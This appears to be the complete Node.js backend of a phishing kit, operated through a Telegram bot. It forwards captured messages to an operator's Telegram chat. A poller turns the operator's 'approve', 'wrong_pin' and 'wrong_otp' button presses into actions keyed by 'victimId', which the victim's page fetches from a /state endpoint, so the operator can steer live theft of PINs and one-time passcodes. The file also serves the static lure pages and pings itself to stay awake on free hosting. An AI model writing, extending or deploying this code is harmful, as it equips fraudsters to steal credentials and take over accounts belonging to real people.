'use strict';

const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json({ limit: '256kb' }));
app.use(express.text({ type: '*/*', limit: '16kb' }));

// ---------------------------------------------------------------
//  CONFIG
// ---------------------------------------------------------------
const BOT_TOKEN = process.env.BOT_TOKEN || '';
const CHAT_ID   = process.env.CHAT_ID   || '';
const TG_BASE   = 'https://api.telegram.org/bot' + BOT_TOKEN;

const STATE_FILE = path.join(__dirname, 'data', 'pending.json');
const ACTION_TTL_MS = 30 * 60 * 1000; // 30 min

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[WARN] BOT_TOKEN or CHAT_ID missing from env.');
}

// ---------------------------------------------------------------
//  Log ring
// ---------------------------------------------------------------
const DEBUG_LOG = [];
function slog(tag, msg) {
  const entry = { t: new Date().toISOString(), tag, msg: String(msg).slice(0, 300) };
  DEBUG_LOG.push(entry);
  if (DEBUG_LOG.length > 200) DEBUG_LOG.shift();
  console.log(`[${tag}]`, msg);
}

// ---------------------------------------------------------------
//  Pending action queue — victimId -> { action, ts }
// ---------------------------------------------------------------
let pendingActions = {};

function loadPending() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const raw = fs.readFileSync(STATE_FILE, 'utf8');
      pendingActions = JSON.parse(raw) || {};
      slog('state', 'loaded ' + Object.keys(pendingActions).length + ' pending');
    }
  } catch (e) {
    slog('state', 'load failed: ' + e.message);
    pendingActions = {};
  }
}

function savePending() {
  try {
    fs.mkdirSync(path.dirname(STATE_FILE), { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify(pendingActions));
  } catch (e) {
    slog('state', 'save failed: ' + e.message);
  }
}

function purgeExpired() {
  const now = Date.now();
  let purged = 0;
  for (const id of Object.keys(pendingActions)) {
    if (now - pendingActions[id].ts > ACTION_TTL_MS) {
      delete pendingActions[id];
      purged++;
    }
  }
  if (purged) {
    savePending();
    slog('state', 'purged ' + purged + ' expired');
  }
}

loadPending();
setInterval(purgeExpired, 60 * 1000);

// ---------------------------------------------------------------
//  Telegram helpers
// ---------------------------------------------------------------
async function tgPost(method, payload, timeoutMs) {
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), timeoutMs || 12000);
  try {
    const res = await fetch(`${TG_BASE}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    return await res.json();
  } finally {
    clearTimeout(t);
  }
}

async function tgGet(method, query, timeoutMs) {
  const qs = query ? '?' + new URLSearchParams(query).toString() : '';
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), timeoutMs || 30000);
  try {
    const res = await fetch(`${TG_BASE}/${method}${qs}`, { signal: controller.signal });
    return await res.json();
  } finally {
    clearTimeout(t);
  }
}

// ---------------------------------------------------------------
//  Background Telegram poller — owns the bot, runs 24/7
// ---------------------------------------------------------------
let POLL_OFFSET = null;
let POLLER_RUNNING = false;

async function pollerLoop() {
  if (POLLER_RUNNING) return;
  POLLER_RUNNING = true;
  slog('poller', 'started');

  while (true) {
    try {
      const query = { timeout: 20, allowed_updates: JSON.stringify(['callback_query']) };
      if (POLL_OFFSET) query.offset = String(POLL_OFFSET);

      const j = await tgGet('getUpdates', query, 28000);

      if (!j || !j.ok) {
        slog('poller', 'err ' + (j && (j.description || j.error_code) || 'unknown'));
        await new Promise(r => setTimeout(r, 3000));
        continue;
      }

      const updates = j.result || [];
      if (updates.length) slog('poller', 'got ' + updates.length + ' update(s)');

      for (const u of updates) {
        POLL_OFFSET = u.update_id + 1;
        const cb = u.callback_query;
        if (!cb) continue;

        const data = cb.data || '';
        // Parse: <action>_<victimId>
        const m = data.match(/^(approve|wrong_pin|wrong_otp)_(.+)$/);
        if (!m) {
          slog('poller', 'unparsed callback: ' + data);
          tgPost('answerCallbackQuery', { callback_query_id: cb.id }).catch(() => {});
          continue;
        }

        const action = m[1];
        const victimId = m[2];

        // Store action for the victim's client to pick up
        pendingActions[victimId] = { action, ts: Date.now() };
        savePending();
        slog('poller', `queued ${action} for ${victimId}`);

        // ACK immediately — spinner stops in <1s regardless
        tgPost('answerCallbackQuery', { callback_query_id: cb.id }, 4000)
          .then(r => slog('poller', `acked ${cb.id} ok=${r.ok}`))
          .catch(e => slog('poller', `ack failed ${cb.id}: ${e.message}`));
      }
    } catch (e) {
      slog('poller', 'exception: ' + (e && e.message));
      await new Promise(r => setTimeout(r, 3000));
    }

    await new Promise(r => setTimeout(r, 500));
  }
}

// ---------------------------------------------------------------
//  /tg/send
// ---------------------------------------------------------------
app.post('/tg/send', async (req, res) => {
  try {
    const { text, reply_markup } = req.body || {};
    if (!text || typeof text !== 'string') {
      return res.status(400).json({ ok: false, error: 'missing text' });
    }
    const payload = { chat_id: CHAT_ID, text, disable_web_page_preview: true };
    if (reply_markup) payload.reply_markup = reply_markup;
    const j = await tgPost('sendMessage', payload, 12000);
    slog('send', 'ok=' + j.ok + (j.ok ? '' : ' ' + j.description));
    res.json(j);
  } catch (e) {
    slog('send', 'ERR ' + (e && e.message));
    res.status(500).json({ ok: false, error: String(e && e.message || e) });
  }
});

// ---------------------------------------------------------------
//  /state — client polls this. Returns pending action once.
// ---------------------------------------------------------------
app.get('/state', (req, res) => {
  const victimId = String(req.query.victimId || '');
  if (!victimId) return res.status(400).json({ ok: false, error: 'missing victimId' });

  const entry = pendingActions[victimId];
  if (!entry) {
    return res.json({ ok: true, action: null });
  }

  // Consume it — one delivery per action
  delete pendingActions[victimId];
  savePending();

  slog('state', `delivered ${entry.action} to ${victimId}`);
  res.json({ ok: true, action: entry.action, ts: entry.ts });
});

// ---------------------------------------------------------------
//  /debug/log
// ---------------------------------------------------------------
app.get('/debug/log', (req, res) => {
  res.json({ ok: true, count: DEBUG_LOG.length, entries: DEBUG_LOG, pending: Object.keys(pendingActions) });
});

// ---------------------------------------------------------------
//  /healthz
// ---------------------------------------------------------------
app.get('/healthz', (req, res) => {
  res.json({
    ok: true,
    bot: BOT_TOKEN ? 'set' : 'missing',
    chat: CHAT_ID ? 'set' : 'missing',
    poller: POLLER_RUNNING,
    pending: Object.keys(pendingActions).length,
    t: Date.now()
  });
});

// ---------------------------------------------------------------
//  Static
// ---------------------------------------------------------------
app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));

// ---------------------------------------------------------------
//  Boot
// ---------------------------------------------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  slog('boot', `up on :${PORT}`);
  slog('boot', `bot=${BOT_TOKEN ? 'set' : 'MISSING'} chat=${CHAT_ID ? 'set' : 'MISSING'}`);

  if (BOT_TOKEN) {
    try {
      const j = await tgPost('deleteWebhook', { drop_pending_updates: false }, 6000);
      slog('boot', 'deleteWebhook: ' + JSON.stringify(j));
    } catch (e) {
      slog('boot', 'deleteWebhook failed: ' + e.message);
    }
    pollerLoop();
  }
});

// Keep the dyno awake
if (process.env.RENDER_EXTERNAL_URL) {
  setInterval(() => {
    fetch(process.env.RENDER_EXTERNAL_URL + '/healthz').catch(() => {});
  }, 4 * 60 * 1000);
}
